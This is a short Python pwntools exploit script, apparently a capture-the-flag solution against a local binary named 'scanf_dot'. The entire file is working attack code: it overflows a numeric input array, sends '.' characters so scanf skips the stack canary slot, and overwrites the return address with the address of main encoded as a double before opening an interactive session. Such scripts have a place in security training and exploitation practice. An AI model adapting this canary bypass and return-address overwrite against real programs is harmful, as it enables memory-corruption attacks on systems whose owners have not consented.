from pwn import *
import struct

def double2long(a):
    packed = struct.pack('d', a)
    unpacked = struct.unpack('q', packed)[0]
    return unpacked
    
def long2double(a):
    packed = struct.pack('q', a)
    unpacked = struct.unpack('d', packed)[0]
    return unpacked
    
process = process('./scanf_dot')
elf = ELF('./scanf_dot')

main_addr = elf.symbols['main']

process.recvuntil(b'add?')
count = 25
process.sendline(str(count-1))

for i in range(count-4):
    process.sendline(b'1')
    print(i)

# avoid the stack canary by .
process.sendline(b'.')
process.sendline(b'.')

main_double = long2double(main_addr)
payload = str(main_double)
print('payload: ', main_double)
# 
process.sendline(payload)
process.interactive()
